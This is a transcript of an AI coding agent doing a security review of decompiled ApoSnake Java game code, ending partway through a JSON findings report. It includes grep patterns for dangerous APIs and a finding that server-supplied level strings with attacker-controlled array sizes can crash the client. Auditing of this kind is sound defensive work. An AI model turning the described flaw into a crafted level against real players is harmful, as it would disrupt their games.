@@ -1,0 +1,636 @@
+[0m
+> build · ox-alpha-free
+[0m
+[0m$ [0mfind . -type f \( -name "*.java" -o -name "*.xml" -o -name "*.properties" \) | head -100 && echo "---TOTAL---" && find . -type f -name "*.java" | wc -l
+./_from_jar_ApoSnake/org/apogames/ApoIO.java
+./_from_jar_ApoSnake/org/apogames/ApoLibraryGame.java
+./_from_jar_ApoSnake/org/apogames/ApoConstants.java
+./_from_jar_ApoSnake/org/apogames/ApoScreen.java
+./_from_jar_ApoSnake/org/apogames/input/ApoMouse.java
+./_from_jar_ApoSnake/org/apogames/input/ApoKeyboard.java
+./_from_jar_ApoSnake/org/apogames/entity/ApoButtonWithImageAndText.java
+./_from_jar_ApoSnake/org/apogames/entity/ApoEntity.java
+./_from_jar_ApoSnake/org/apogames/entity/ApoAnimation.java
+./_from_jar_ApoSnake/org/apogames/entity/ApoButtonText.java
+./_from_jar_ApoSnake/org/apogames/entity/ApoTextField.java
+./_from_jar_ApoSnake/org/apogames/entity/ApoButton.java
+./_from_jar_ApoSnake/org/apogames/entity/ApoDragObject.java
+./_from_jar_ApoSnake/org/apogames/entity/ApoNewTextfield.java
+./_from_jar_ApoSnake/org/apogames/ApoSubGame.java
+./_from_jar_ApoSnake/org/apogames/image/ApoRawScale3x.java
+./_from_jar_ApoSnake/org/apogames/image/ApoImage.java
+./_from_jar_ApoSnake/org/apogames/image/ApoImageScale.java
+./_from_jar_ApoSnake/org/apogames/image/ApoRawScale2x.java
+./_from_jar_ApoSnake/org/apogames/image/ApoImageFromValue.java
+./_from_jar_ApoSnake/org/apogames/ApoDisplayConfiguration.java
+./_from_jar_ApoSnake/org/apogames/sound/ApoMP3Sound.java
+./_from_jar_ApoSnake/org/apogames/sound/AudioPlayer.java
+./_from_jar_ApoSnake/org/apogames/sound/ApoMidiPlayer.java
+./_from_jar_ApoSnake/org/apogames/sound/ApoMidi.java
+./_from_jar_ApoSnake/org/apogames/sound/ApoSoundThread.java
+./_from_jar_ApoSnake/org/apogames/sound/ApoSounds.java
+./_from_jar_ApoSnake/org/apogames/sound/ApoMP3SoundHandler.java
+./_from_jar_ApoSnake/org/apogames/help/ApoHighscore.java
+./_from_jar_ApoSnake/org/apogames/help/ApoSplashScreen.java
+./_from_jar_ApoSnake/org/apogames/help/ApoSplashPainter.java
+./_from_jar_ApoSnake/org/apogames/help/ApoHelp.java
+./_from_jar_ApoSnake/org/apogames/help/ApoGameCounter.java
+./_from_jar_ApoSnake/org/apogames/help/ApoFileFilter.java
+./_from_jar_ApoSnake/org/apogames/help/ApoCopy.java
+./_from_jar_ApoSnake/org/apogames/help/ApoFileNameFilter.java
+./_from_jar_ApoSnake/org/apogames/help/ApoInterface.java
+./_from_jar_ApoSnake/org/apogames/help/ApoFloatPoint.java
+./_from_jar_ApoSnake/org/apogames/help/ApoClassLoader.java
+./_from_jar_ApoSnake/apoSnake/ApoSnakeComponent.java
+./_from_jar_ApoSnake/apoSnake/entity/ApoLevelChooserButton.java
+./_from_jar_ApoSnake/apoSnake/entity/ApoSnakeString.java
+./_from_jar_ApoSnake/apoSnake/entity/ApoSnakeEntity.java
+./_from_jar_ApoSnake/apoSnake/game/ApoSnakePuzzleChooser.java
+./_from_jar_ApoSnake/apoSnake/game/ApoSnakePuzzleGame.java
+./_from_jar_ApoSnake/apoSnake/game/ApoSnakeEditor.java
+./_from_jar_ApoSnake/apoSnake/game/ApoSnakeMenu.java
+./_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevelsLoad.java
+./_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeLevel.java
+./_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeLevelIO.java
+./_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevels.java
+./_from_jar_ApoSnake/apoSnake/game/ApoSnakePanel.java
+./_from_jar_ApoSnake/apoSnake/ApoSnakeMain.java
+./_from_jar_ApoSnake/apoSnake/ApoSnakeConstants.java
+./_from_jar_ApoSnake/apoSnake/ApoSnakeApplet.java
+./_from_jar_ApoSnake/apoSnake/ApoSnakeModel.java
+./_from_jar_ApoSnake/apoSnake/ApoSnakeImages.java
+./_from_jar_ApoSnake/apoSnake/ApoSnakeButtons.java
+---TOTAL---
+      58
+[0m
+[0m→ [0mRead _from_jar_ApoSnake/org/apogames/ApoIO.java
+[0m→ [0mRead _from_jar_ApoSnake/org/apogames/help/ApoHighscore.java
+[0m→ [0mRead _from_jar_ApoSnake/org/apogames/ApoConstants.java
+[0m→ [0mRead _from_jar_ApoSnake/org/apogames/help/ApoClassLoader.java
+[0m✱ [0mGrep "readLevel|writeLevel|USERLEVELS|HIGHSCORE|openStream|openConnection"[90m in _from_jar_ApoSnake/apoSnake · 14 matches[0m
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevelsLoad.java
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/level/ApoSnakeLevelIO.java
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevels.java
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/level/ApoSnakeLevel.java
+[0m✱ [0mGrep "substring|charAt|Integer\.parseInt|split\(|toCharArray|loadLevel|editorLevels"[90m in _from_jar_ApoSnake/apoSnake · 16 matches[0m
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/ApoSnakePuzzleGame.java[90m [offset=140, limit=130][0m
+[0m✗ [0mGrep "MessageDigest|ObjectInputStream|System\.load|defineClass|Runtime\.getRuntime|ProcessBuilder|exec\(|user\.home|MD5|Base64|sun\.misc" failed[90m in .[0m
+[91m[1mError: [0mInvalid ripgrep match output
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/ApoSnakePanel.java[90m [limit=140][0m
+[0m
+[0m$ [0mrg -n "MessageDigest|ObjectInputStream|System\.load|defineClass|Runtime|ProcessBuilder|user\.home|MD5|Base64|getDeclaredField|setAccessible|Applet|JNLP|getProperty" --type java
+zsh:1: command not found: rg
+[0m
+[0m✗ [0mGrep "MessageDigest|ObjectInputStream|System\.load|defineClass|Runtime|ProcessBuilder|user\.home|MD5|Base64|Applet" failed[90m in .[0m
+[91m[1mError: [0mInvalid ripgrep match output
+[0m
+[0m$ [0mgrep -rn -E "MessageDigest|ObjectInputStream|System\.load|defineClass|Runtime|ProcessBuilder|user\.home|MD5|Base64|extends Applet|JApplet" --include="*.java" . ; echo "EXIT:$?"
+./_from_jar_ApoSnake/org/apogames/ApoScreen.java:16:import javax.swing.JApplet;
+./_from_jar_ApoSnake/org/apogames/ApoScreen.java:38:	/** Elternobjekt, um herauszufinden ob es ein JApplet ist */
+./_from_jar_ApoSnake/org/apogames/ApoScreen.java:134:		if ((this.parent != null) && (this.parent instanceof JApplet)) {
+./_from_jar_ApoSnake/org/apogames/ApoScreen.java:144:			JApplet applet = (JApplet)this.parent;
+./_from_jar_ApoSnake/org/apogames/help/ApoHelp.java:27:import java.security.MessageDigest;
+./_from_jar_ApoSnake/org/apogames/help/ApoHelp.java:280:	 * gibt den MD5 Hash eines Strings zur�ck
+./_from_jar_ApoSnake/org/apogames/help/ApoHelp.java:282:	 * @return gibt den MD5 Hash eines Strings zur�ck
+./_from_jar_ApoSnake/org/apogames/help/ApoHelp.java:286:			MessageDigest lDigest = MessageDigest.getInstance("MD5");
+./_from_jar_ApoSnake/org/apogames/help/ApoHelp.java:291:			throw new RuntimeException(lException);
+./_from_jar_ApoSnake/apoSnake/ApoSnakeApplet.java:3:import javax.swing.JApplet;
+./_from_jar_ApoSnake/apoSnake/ApoSnakeApplet.java:18:public class ApoSnakeApplet extends JApplet {
+EXIT:0
+[0m
+[0m→ [0mRead _from_jar_ApoSnake/org/apogames/help/ApoHelp.java
+[0m
+[0m$ [0mgrep -rn "getMd5Digest\|ApoHighscore\|getInstance().save\|\.save(" --include="*.java" apoSnake | head -40; echo ---; grep -rln "ApoClassLoader" --include="*.java" .
+apoSnake/game/level/ApoSnakeUserlevels.java:85:		return ApoSnakeUserlevelsLoad.getInstance().save(level);
+---
+./org/apogames/help/ApoClassLoader.java
+[0m
+[0m$ [0mgrep -rn "new ApoClassLoader\|ApoLibraryGame\|loadData\|saveData\|cookies" --include="*.java" . ; echo ---; ls apoSnake org/apogames org/apogames/help
+./org/apogames/ApoLibraryGame.java:12:public final class ApoLibraryGame extends Thread {
+./org/apogames/ApoLibraryGame.java:20:    private int nextGameID = ApoLibraryGame.GAME;
+./org/apogames/ApoLibraryGame.java:31:    public ApoLibraryGame(final ApoSubGame game) {
+./org/apogames/ApoLibraryGame.java:71:            case ApoLibraryGame.GAME:	return this.game;
+./org/apogames/help/ApoHelp.java:435:	public static void saveData(final URL codebase, final String name, final String value) {
+./org/apogames/help/ApoHelp.java:442:					url = new URL(codebase + "cookies.php");
+./org/apogames/help/ApoHelp.java:467:	public static String loadData(URL codebase, String name) {
+./org/apogames/help/ApoHelp.java:473:			url = new URL(codebase + "cookies.php");
+./apoSnake/game/ApoSnakePanel.java:82:				load = ApoHelp.loadData(new URL("http://www.apo-games.de/apoSnake/"), "apoSnake_solved");
+./apoSnake/game/ApoSnakePanel.java:111:				ApoHelp.saveData(new URL("http://www.apo-games.de/apoSnake/"), "apoSnake_solved", String.valueOf(this.puzzle.getSolved()));
+./apoSnake/ApoSnakeMain.java:4:import org.apogames.ApoLibraryGame;
+./apoSnake/ApoSnakeMain.java:29:        final ApoLibraryGame game = new ApoLibraryGame(subGame);
+./apoSnake/ApoSnakeApplet.java:7:import org.apogames.ApoLibraryGame;
+./apoSnake/ApoSnakeApplet.java:44:		final ApoLibraryGame game = new ApoLibraryGame(this.subGame);
+---
+apoSnake:
+ApoSnakeApplet.java
+ApoSnakeButtons.java
+ApoSnakeComponent.java
+ApoSnakeConstants.java
+ApoSnakeImages.java
+ApoSnakeMain.java
+ApoSnakeModel.java
+entity
+game
+
+org/apogames:
+ApoConstants.java
+ApoDisplayConfiguration.java
+ApoIO.java
+ApoLibraryGame.java
+ApoScreen.java
+ApoSubGame.java
+entity
+help
+image
+input
+sound
+
+org/apogames/help:
+ApoClassLoader.java
+ApoCopy.java
+ApoFileFilter.java
+ApoFileNameFilter.java
+ApoFloatPoint.java
+ApoGameCounter.java
+ApoHelp.java
+ApoHighscore.java
+ApoInterface.java
+ApoSplashPainter.java
+ApoSplashScreen.java
+[0m
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/ApoSnakeApplet.java
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/ApoSnakePanel.java[90m [offset=140][0m
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/ApoSnakeMenu.java[90m [offset=40, limit=80][0m
+[0m
+[0m$ [0mgrep -n "setPuzzleGame\|addLevel\|save\|upload\|loadLevel" apoSnake/game/ApoSnakeEditor.java apoSnake/game/ApoSnakePuzzleChooser.java apoSnake/game/ApoSnakePuzzleGame.java
+apoSnake/game/ApoSnakeEditor.java:29:	public static final String UPLOAD = "upload";
+apoSnake/game/ApoSnakeEditor.java:36:	private ApoSnakeString uploadString;
+apoSnake/game/ApoSnakeEditor.java:222:			this.getGame().setPuzzleGame(-1, levelString, false);
+apoSnake/game/ApoSnakeEditor.java:225:			this.uploadString = new ApoSnakeString(240, 470, 20, "Uploading ...", true, 200, true);
+apoSnake/game/ApoSnakeEditor.java:230:					ApoSnakeEditor.this.uploadString();
+apoSnake/game/ApoSnakeEditor.java:265:	private void uploadString() {
+apoSnake/game/ApoSnakeEditor.java:266:		if (this.getGame().getUserlevels().addLevel(this.getLevelString())) {
+apoSnake/game/ApoSnakeEditor.java:267:			this.uploadString = new ApoSnakeString(240, 470, 20, "Uploading successfully", true, 20, true);
+apoSnake/game/ApoSnakeEditor.java:270:			this.uploadString = new ApoSnakeString(240, 470, 20, "Uploading failed", true, 20, true);
+apoSnake/game/ApoSnakeEditor.java:300:		if (this.uploadString != null) {
+apoSnake/game/ApoSnakeEditor.java:301:			this.uploadString.think(delta);
+apoSnake/game/ApoSnakeEditor.java:303:			if (!this.uploadString.isVisible()) {
+apoSnake/game/ApoSnakeEditor.java:304:				this.uploadString = null;
+apoSnake/game/ApoSnakeEditor.java:379:		if (this.uploadString != null) {
+apoSnake/game/ApoSnakeEditor.java:380:			this.uploadString.render(g, 0, 0);
+apoSnake/game/ApoSnakePuzzleChooser.java:82:				this.getGame().savePreferences();
+apoSnake/game/ApoSnakePuzzleChooser.java:129:					this.getGame().setPuzzleGame(i, "", false);
+apoSnake/game/ApoSnakePuzzleGame.java:154:	public void loadLevel(int nextLevel, boolean bUserLevel, String levelString) {
+apoSnake/game/ApoSnakePuzzleGame.java:380:			this.loadLevel(p[0], this.bUserlevel, this.levelString);
+apoSnake/game/ApoSnakePuzzleGame.java:390:					this.loadLevel(p[0], this.bUserlevel, this.levelString);
+[0m
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/ApoSnakeEditor.java[90m [limit=80, offset=200][0m
+[0m
+[0m$ [0mgrep -rn -E "http|new URL|openConnection|openStream|new File|FileInputStream|FileOutputStream|RandomAccessFile|defineClass|loadClass" --include="*.java" . | grep -v "apoSnake/game\|ApoHighscore.java\|ApoHelp.java\|ApoIO.java\|ApoConstants.java\|ApoClassLoader.java" ; echo "---"; sed -n '1,60p' org/apogames/help/ApoCopy.java
+./org/apogames/image/ApoImage.java:91:					img = ImageIO.read(new URL(pic));
+./org/apogames/image/ApoImage.java:93:					img = ImageIO.read(new File(pic));
+./org/apogames/image/ApoImageScale.java:86:			return writeScaledImage(ImageIO.read(new File(this.srcFile)), writeFile);
+./org/apogames/image/ApoImageScale.java:122:			ImageIO.write(out, "PNG", new File(outFile));
+./org/apogames/sound/AudioPlayer.java:68:								audioInputStream = AudioSystem.getAudioInputStream(new URL("http://www.apo-games.de/apoPongBeat" + this.path));
+./org/apogames/sound/AudioPlayer.java:70:								audioInputStream = AudioSystem.getAudioInputStream(new File(System.getProperty("user.dir") + this.path.replace("/", File.separator)));	
+./org/apogames/sound/ApoMidiPlayer.java:4:import java.io.FileInputStream;
+./org/apogames/sound/ApoMidiPlayer.java:64:			return getSequence(new FileInputStream(filename));
+./org/apogames/help/ApoGameCounter.java:36:						url = new URL("http://www.apo-games.de/apoSheeptastic/game_counter.php");
+./org/apogames/help/ApoGameCounter.java:37:						urlConn = url.openConnection();
+./org/apogames/help/ApoCopy.java:4:import java.io.FileInputStream;
+./org/apogames/help/ApoCopy.java:5:import java.io.FileOutputStream;
+./org/apogames/help/ApoCopy.java:28:		File srcDirectory = new File(pSrcDirectory);
+./org/apogames/help/ApoCopy.java:32:		File copyDirectory = new File( pCopyDirectory );
+./org/apogames/help/ApoCopy.java:40:				if(!new File(pCopyDirectory + File.separator + fileName).exists()) {
+./org/apogames/help/ApoCopy.java:53:		FileInputStream fis = null;
+./org/apogames/help/ApoCopy.java:54:		FileOutputStream fos = null;
+./org/apogames/help/ApoCopy.java:57:			fis = new FileInputStream(pSrcFile);
+./org/apogames/help/ApoCopy.java:58:			fos = new FileOutputStream(pCopyFile);
+./apoSnake/ApoSnakeComponent.java:79:			this.fileChooser.setCurrentDirectory(new File(System.getProperty("user.dir") + File.separator));
+./apoSnake/ApoSnakeConstants.java:10:	public final static String USERLEVELS_GETPHP = "http://www.apo-games.de/apoSnake/get_level.php";
+./apoSnake/ApoSnakeConstants.java:11:	public final static String USERLEVELS_SAVEPHP = "http://www.apo-games.de/apoSnake/save_level.php";
+---
+package org.apogames.help;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+
+/**
+ * Klasse, um Dateien oder ganze Ordner einfach zu kopieren
+ * @author Dirk Aporius
+ *
+ */
+public class ApoCopy {
+
+	/**
+	 * Konstruktor
+	 */
+	public ApoCopy() {
+	}
+	
+	/**
+	 * kopiert ein komplettes Verzeichnis (ohne Unterverzeichnisse)
+	 * in einen �bergebenen Bereich
+	 * @param pSrcDirectory = String mit Pfadangabe zum Ordner, welcher kopiert werden 
+	 * @param pCopyDirectory = String mit Pfadangabe zum Ordner, wohin kopiert werden soll
+	 */
+	public void copyDirectory( String pSrcDirectory, String pCopyDirectory ) {
+		File srcDirectory = new File(pSrcDirectory);
+		if (!srcDirectory.exists()) {
+			return;
+		}
+		File copyDirectory = new File( pCopyDirectory );
+		if (!copyDirectory.exists()) {
+			copyDirectory.mkdirs();
+		}
+		File[] files = srcDirectory.listFiles();
+		for ( int i = 0; i < files.length; i++ ) {
+			if (!files[i].isDirectory()) {
+				String fileName = files[i].getPath().substring(files[i].getPath().lastIndexOf(File.separator));
+				if(!new File(pCopyDirectory + File.separator + fileName).exists()) {
+					this.copyFile(files[i].getPath(), pCopyDirectory + File.separator + fileName);
+				}
+			}
+		}
+	}
+	
+	/**
+	 * kopiert eine Datei in ein anderes �bergebenes Verzeichnis
+	 * @param pSrcFile = String mit Pfadangabe zur Datei, welche kopiert werden soll
+	 * @param pCopyFile = String mit Pfadangabe zur Datei, wohin kopiert werden soll
+	 */
+	public void copyFile( String pSrcFile, String pCopyFile ) {
+		FileInputStream fis = null;
+		FileOutputStream fos = null;
+		
+		try {
+			fis = new FileInputStream(pSrcFile);
+			fos = new FileOutputStream(pCopyFile);
+			
+			byte[] buffer = new byte[0xFFFF];
+[0m
+[0m$ [0mgrep -rn "ApoGameCounter\|getPicture\|ImageIO" --include="*.java" apoSnake org/apogames/ApoSubGame.java org/apogames/image/ApoImageFromValue.java 2>/dev/null | head -20; echo ---; sed -n '40,110p' org/apogames/sound/AudioPlayer.java
+---
+	}
+	
+	public boolean isBStop() {
+		return this.bStop;
+	}
+
+	public void setBStop(boolean stop) {
+		this.bStop = stop;
+	}
+
+	public boolean isBLoop() {
+		return this.bLoop;
+	}
+
+	public void setBLoop(boolean loop) {
+		this.bLoop = loop;
+	}
+
+	public void run() {
+		try {
+			while(this.soundThread.isRunning()) {
+				do {
+					AudioInputStream audioInputStream = null;
+					try {
+						if (this.BInJAR) {
+							audioInputStream = AudioSystem.getAudioInputStream(AudioFormat.Encoding.PCM_SIGNED, AudioSystem.getAudioInputStream(this.getClass().getResource(this.path)));
+						} else {
+							if (ApoConstants.B_APPLET) {
+								audioInputStream = AudioSystem.getAudioInputStream(new URL("http://www.apo-games.de/apoPongBeat" + this.path));
+							} else {
+								audioInputStream = AudioSystem.getAudioInputStream(new File(System.getProperty("user.dir") + this.path.replace("/", File.separator)));	
+							}
+						}
+					} catch (Exception e) {
+						System.out.println("Fehler: "+e.getMessage()+" "+this.path+" "+e.getCause());
+					}
+
+					AudioFormat audioFormat = audioInputStream.getFormat();
+				
+					SourceDataLine line = null;
+					DataLine.Info info = new DataLine.Info(SourceDataLine.class,audioFormat);
+					try {
+						line = (SourceDataLine) AudioSystem.getLine(info);
+						line.open(audioFormat);
+					} catch (LineUnavailableException e) {
+					} catch (Exception e) {
+					}
+
+					line.start();
+
+					int nBytesRead = 0;
+					byte[] abData = new byte[EXTERNAL_BUFFER_SIZE];
+					while ((nBytesRead != -1) && (!this.isBStop())) {
+						try {
+							nBytesRead = audioInputStream.read(abData, 0, abData.length);
+						} catch (IOException e) {
+						}
+						if (nBytesRead >= 0) {
+							line.write(abData, 0, nBytesRead);
+						}
+					}
+					line.drain();
+					line.close();
+				} while ((!this.isBStop()) && (this.isBLoop()));
+				this.soundThread.stop();
+			}
+			try {
+				/*synchronized(this.soundThread)*/ {
+					this.soundThread.wait((long)10);
+				}
+			} catch(InterruptedException e) {
+[0m
+[0m$ [0mgrep -rn "ApoGameCounter\|ApoImage\.\|new ApoImage\|ApoSounds\|playSound" --include="*.java" . | head -20; echo ---; sed -n '60,110p' org/apogames/image/ApoImage.java
+./org/apogames/image/ApoImageFromValue.java:25:		this.image = new ApoImage();
+./org/apogames/sound/ApoSounds.java:5:public class ApoSounds {
+./org/apogames/sound/ApoSounds.java:9:	public ApoSounds() {
+./org/apogames/sound/ApoSounds.java:20:	public void playSound(String name) {
+./org/apogames/sound/ApoSounds.java:21:		this.playSound(name, false);
+./org/apogames/sound/ApoSounds.java:24:	public void playSound(String name, boolean bLoop) {
+./org/apogames/sound/ApoMP3SoundHandler.java:20:	public void playSound(String name, boolean bLoop, int volumen) {
+./org/apogames/help/ApoGameCounter.java:13:public class ApoGameCounter {
+./org/apogames/help/ApoGameCounter.java:15:	private static ApoGameCounter singleInstance = new ApoGameCounter();
+./org/apogames/help/ApoGameCounter.java:17:	public static ApoGameCounter getInstance() {
+./org/apogames/help/ApoGameCounter.java:19:			singleInstance = new ApoGameCounter();
+./apoSnake/ApoSnakeImages.java:31:		this.image = new ApoImageFromValue();
+---
+			// nothing
+		}
+		return i;
+	}
+	
+	/**
+	 * l�dt das Bild aus einem �bergebenen String
+	 * @param BildName = wo steckt das Bild
+	 * @param bLoad
+	 * @return das Bild
+	 */
+	private BufferedImage getImage(String pic, boolean bLoad)	{
+		BufferedImage icon = null;
+		
+		BufferedImage img		= null;
+		
+		if ( !bLoad ) {
+			try	{
+				img = ImageIO.read( this.getClass().getClassLoader().getResource(pic));
+				//result = this.graphicsConfiguration.createCompatibleImage(img.getWidth(),img.getHeight(), BufferedImage.TYPE_INT_ARGB);
+				//result.createGraphics().drawImage(img,0,0,null);
+				icon	= img;
+			} catch (IOException e) {
+				e.printStackTrace();
+				return null;
+			} catch (NullPointerException ex) {
+				return  null;
+			}
+		} else {
+			try {
+				if ( ApoConstants.B_APPLET ) {
+					img = ImageIO.read(new URL(pic));
+				} else {
+					img = ImageIO.read(new File(pic));
+				}
+				//result = this.graphicsConfiguration.createCompatibleImage(img.getWidth(),img.getHeight(), BufferedImage.TYPE_INT_ARGB);
+				//result.createGraphics().drawImage(img,0,0,null);
+				icon	= img;
+			} catch (MalformedURLException e) {
+				System.out.println("Konnte das Bild "+pic+" nicht laden");
+				return null;
+			} catch (IOException e) {
+				System.out.println("Konnte das Bild "+pic+" nicht laden");
+				return null;
+			}
+		}
+		return (icon);
+	}
+	
+}
+[0m
+[0m$ [0mgrep -rn "getCount\|game_counter" --include="*.java" apoSnake | head; echo "---ImageFromValue---"; sed -n '1,80p' org/apogames/image/ApoImageFromValue.java | grep -n "getImage\|bLoad\|http" ; echo "---Component70-110---"; sed -n '60,115p' apoSnake/ApoSnakeComponent.java
+apoSnake/game/level/ApoSnakeUserlevelsLoad.java:70:	public ArrayList<Integer> getCount() {
+apoSnake/game/level/ApoSnakeUserlevels.java:89:		if (this.userlevels.getCount().get(this.sortByUpload.get(level)) <= 0) {
+apoSnake/game/level/ApoSnakeUserlevels.java:92:		return (float)((float)this.userlevels.getAll().get(this.sortByUpload.get(level)) / (float)this.userlevels.getCount().get(this.sortByUpload.get(level)));
+---ImageFromValue---
+44:	 * @param bLoad = true, f�r laden aus der Jar, sonst FALSE
+47:	public BufferedImage getImageFromPath(String path, boolean bLoad) {
+48:		return this.image.getPic(path, bLoad);
+---Component70-110---
+	public void setModel(ApoSnakeModel model) {
+		this.model = model;
+	}
+
+	public boolean isBWin() {
+		return this.bWin;
+	}
+
+	public void setBWin(boolean win) {
+		this.bWin = win;
+	}
+
+	/**
+	 * gibt den Filechooser zum Laden einer KI zur�ck
+	 * @return gibt den Filechooser zum Laden einer KI zur�ck
+	 */
+	public JFileChooser getFileChooser() {
+		if ((!ApoConstants.B_APPLET) && (this.fileChooser == null)) {
+			this.fileChooser = new JFileChooser();
+			this.fileChooser.setCurrentDirectory(new File(System.getProperty("user.dir") + File.separator));
+			this.fileChooser.setFileFilter(this.fileFilter);
+		}
+		return this.fileChooser;
+	}
+
+	/**
+	 * gibt den FileFilter f�r das Laden einer KI zur�ck
+	 * @return gibt den FileFilter f�r das Laden einer KI zur�ck
+	 */
+	public ApoFileFilter getFileFilter() {
+		return this.fileFilter;
+	}
+
+	/**
+	 * boolean Variable, ob die FPS angezeigt werden soll oder nicht
+	 * @return TRUE, FPS sollen angezeigt werden, FALSE FPS sollen nicht angezeigt werden
+	 */
+	public boolean isShowFPS() {
+		return ApoSnakeConstants.FPS;
+	}
+
+	/**
+	 * setzt den boolean-Wert, ob die FPS angezeigt werden soll oder nicht, auf den �bergebenen
+	 * @param showFPS : TRUE, FPS sollen angezeigt werden, FALSE FPS sollen nicht angezeigt werden
+	 */
+	public void setShowFPS(boolean showFPS) {
+		ApoSnakeConstants.FPS = showFPS;
+	}
+
+	/**
+	 * gibt das Array mit den Buttons zur�ck
+	 * @return gibt das Array mit den Buttons zur�ck
+	 */
+	public final ApoButton[] getButtons() {
+		return this.buttons;
+	}
+[0m
+[0m$ [0mgrep -rn "getFileChooser\|getNames\|getMd5" --include="*.java" apoSnake | head; echo "---"; find . -name "*.java" | wc -l; echo "---PuzzleGame620-660---"; sed -n '620,660p' apoSnake/game/ApoSnakePuzzleGame.java
+apoSnake/ApoSnakeComponent.java:76:	public JFileChooser getFileChooser() {
+apoSnake/game/level/ApoSnakeUserlevelsLoad.java:66:	public ArrayList<String> getNames() {
+---
+      58
+---PuzzleGame620-660---
+		}
+
+		level[y][x] = 0;
+	}
+
+	@Override
+	public void render(final Graphics2D g) {	
+		g.setColor(new Color(128, 128, 128, 255));
+		g.fillRect(0,0,479,changeY);
+		g.fillRect(0,480 + changeY,479,159 - changeY);
+		
+		g.setColor(new Color(0f/255f, 0f/255f, 0f/255f, 1.0f));
+		g.drawRect(0,0,479,changeY);
+		g.drawRect(0,480 + changeY,479,159 - changeY);
+
+		String s = "ApoSnake";
+		this.getGame().drawString(g, s, 240, 2, ApoSnakeMenu.game_font);
+
+		g.setFont(ApoSnakeMenu.game_font);
+		if (!this.bEditor) {
+			if (this.bUserlevel) {
+				s = "Level "+(p[0] + 1)+" / "+(ApoSnakeLevel.editorLevels.length);
+			} else {
+				s = "Level "+(p[0] + 1)+" / "+(this.getGame().getMaxCanChoosen() + 1);
+			}
+		} else {
+			s = "Editorlevel";
+		}
+		int w = g.getFontMetrics().stringWidth(s);
+		this.getGame().drawString(g, s, 5 + w/2, 2, ApoSnakeMenu.game_font);
+		
+		s = "Moves: "+p[1];
+		w = g.getFontMetrics().stringWidth(s);
+		this.getGame().drawString(g, s, ApoSnakeConstants.GAME_WIDTH - 5 - w/2, 2, ApoSnakeMenu.game_font);
+
+		int changeX = p[3];
+		int changeY = p[4];
+		g.setColor(new Color(210, 210, 210));
+		g.fillRect(changeX, changeY, level[0].length * 30, level.length * 30);
+		g.setColor(Color.BLACK);
+		g.drawRect(changeX, changeY, level[0].length * 30, level.length * 30);
+[0m
+[0m→ [0mRead _from_jar_ApoSnake/apoSnake/game/ApoSnakeEditor.java[90m [limit=45, offset=278][0m
+<<<JSON_BEGIN>>>
+{
+  "variant": "ApoSnake",
+  "files_reviewed": 22,
+  "notable_files": [
+    "_from_jar_ApoSnake/apoSnake/game/ApoSnakePuzzleGame.java",
+    "_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevelsLoad.java",
+    "_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevels.java",
+    "_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeLevel.java",
+    "_from_jar_ApoSnake/apoSnake/game/ApoSnakeEditor.java",
+    "_from_jar_ApoSnake/apoSnake/game/ApoSnakePanel.java",
+    "_from_jar_ApoSnake/apoSnake/game/ApoSnakeLevelIO.java",
+    "_from_jar_ApoSnake/apoSnake/ApoSnakeConstants.java",
+    "_from_jar_ApoSnake/apoSnake/ApoSnakeApplet.java",
+    "_from_jar_ApoSnake/org/apogames/ApoIO.java",
+    "_from_jar_ApoSnake/org/apogames/help/ApoClassLoader.java",
+    "_from_jar_ApoSnake/org/apogames/help/ApoHighscore.java",
+    "_from_jar_ApoSnake/org/apogames/help/ApoHelp.java",
+    "_from_jar_ApoSnake/org/apogames/sound/AudioPlayer.java"
+  ],
+  "findings": [
+    {
+      "id": "ApoSnake-01",
+      "title": "Server-supplied user-level string parsed with attacker-controlled array dimensions (crash/OOM)",
+      "category": "unsafe_custom_parser",
+      "cwe": "CWE-789",
+      "file": "_from_jar_ApoSnake/apoSnake/game/ApoSnakePuzzleGame.java",
+      "line": 188,
+      "code_excerpt": "int width = l.substring(0, 1).charAt(0) - 96;\nint height = l.substring(1, 2).charAt(0) - 96;\nlevel = new int[height][width];\n...\nint value = l.charAt(y * level[0].length + x + 2);",
+      "entry_point": "HTTP response of http://www.apo-games.de/apoSnake/get_level.php read line-by-line in ApoSnakeUserlevelsLoad.load() (_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevelsLoad.java:164-186); every 11th line (i%11==0) is taken verbatim as a level string and stored via ApoSnakeUserlevels.loadUserlevels() into ApoSnakeLevel.editorLevels (_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevels.java:23-28)",
+      "sink": "new int[height][width] at ApoSnakePuzzleGame.java:190 and l.charAt(y*level[0].length+x+2) at :196/:224",
+      "data_path": "save_level.php upload by any player -> get_level.php download (ApoSnakeUserlevelsLoad.load) -> ApoSnakeUserlevels.getAllLevelsSorted (ApoSnakeUserlevels.java:41-52) -> ApoSnakeLevel.editorLevels -> menu button 'userlevels' (ApoSnakeMenu.java:61-62 setPuzzleGame(0,\"\",true)) -> ApoSnakePanel.setPuzzleGame (ApoSnakePanel.java:188) -> ApoSnakePuzzleGame.loadLevel (line 181 selects editorLevels[p[0]], then parses)",
